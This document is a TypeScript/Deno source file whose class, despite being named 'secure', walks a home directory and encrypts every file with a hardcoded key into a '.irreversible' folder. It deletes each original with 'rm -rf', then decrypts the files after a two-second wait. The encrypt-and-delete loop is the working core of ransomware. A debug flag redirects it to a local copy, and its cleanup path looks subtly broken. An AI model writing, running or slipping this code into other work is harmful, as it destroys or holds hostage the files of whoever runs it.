export class secure {
    private debug: boolean = true;
    private key = "1234";

    public async main(infos: any) {
        console.log('[+] Secure mode starting...');
        await this.securiseHomeDir(infos);
        
        await this.waitSec(2);

        await this.unSecuriseHomeDir(infos);
    
    }


    private async waitSec(time: number) {
        console.log('[-] Wait '+time+' seconds...');
        return new Promise(resolve => {
            setTimeout(() => {
                resolve(null);
            }, time * 1000);
        });
    }


    private async securiseHomeDir(infos: any){
        let dir = infos.homeDir;
        if(this.debug){
            dir = './_em'+dir
        }
        console.log('[+] Securise home dir: '+dir);
        let files = await this.explore_dir(dir)
        console.log(`[+] ${files.dir.length} directories found and ${files.files.length} files found`);

        console.log('[+] Creating Dir Arch clone in /.irreversible');
        await this.createFileArch(dir+'.irreversible/', files.dir);

        console.log('[@] Start encrypting files...');
        for(let i = 0; i<files.files.length; i++){
            let path = files.files[i].replace(dir, '');
            await this.execute(`node ./node/encrypt.js ${this.key} ${files.files[i]} ${dir}.irreversible/${path}`);
            await this.execute('rm -rf '+files.files[i]);
        }

        console.log('[@] End encrypting file...');
    }

    public async unSecuriseHomeDir(infos: any){
        let dir = infos.homeDir;
        if(this.debug){
            dir = './_em'+dir
        }
        dir+='.irreversible/';
        console.log('[+] un-Securise home dir: '+dir);
        let files = await this.explore_dir(dir)
        console.log(`[+] ${files.dir.length} directories found and ${files.files.length} files found`);

        /// DECRIPT FILE
        console.log('[@] Start decrypting files...');
        await this.createFileArch(dir.replace('.irreversible', ''), files.dir);
        for(let i = 0; i<files.files.length; i++){
            let path = files.files[i];
            await this.execute(`node ./node/decrypt.js ${this.key} ${path} ${dir.replace('.irreversible', '').replace('//', '/')}${path.replace(dir, '')}`);
        }
        console.log('[@] End decrypting file...');
        console.log('[-] Delete .irreversible dir...');
        await this.execute('rm -rf '+dir+'.irreversible');
        console.log('[+] End un-Securise home dir...');
    }


    private async createFileArch(baseDir, list){
        await this.execute('mkdir -p '+baseDir);
        for(let i = 0; i<list.length; i++){
            console.log('[+] Create archive: '+baseDir+list[i].replace(baseDir, ''));
            await this.execute('mkdir -p '+baseDir+list[i].replace(baseDir, ''));
        }
    }

    //private space
    private async execute(commande: any) {
        var content = "";
        var p = Deno.run({
            cmd: commande.split(' '),
            stdout: "piped",
            stderr: "piped"
        });
        var {
            code
        } = await p.status();
        if (code === 0) {
            var rawOutput = await p.output();
            content = new TextDecoder().decode(rawOutput);
        } else {
            var rawError = await p.stderrOutput();
            var errorString = new TextDecoder().decode(rawError);
            console.log('[Error] - ' + errorString);
        }
        return content
    }

    async explore_dir(files: string) {
        var dir0 = files
        var list_dir = []
        var user_files = []
        var unchecked = [dir0]

        while (unchecked.length != 0) {
            var list = await this.execute('ls -ap ' + unchecked[0])
            var dir = list.split('\n')
            dir = dir.slice(2, dir.length - 1)
            for (var i = 0; i < dir.length; i++) {
                if (dir[i].endsWith("/")) {
                    if(!dir[i].startsWith("irreversible") && !dir[i].startsWith(".irreversible")){
                        list_dir.push(unchecked[0] + dir[i])
                        unchecked.push(unchecked[0] + dir[i])
                    }
                } else {
                    user_files.push(unchecked[0] + dir[i])
                }
            }
            unchecked = unchecked.slice(1, unchecked.length)
        }
        return {
            dir: list_dir,
            files: user_files
        }
    }

}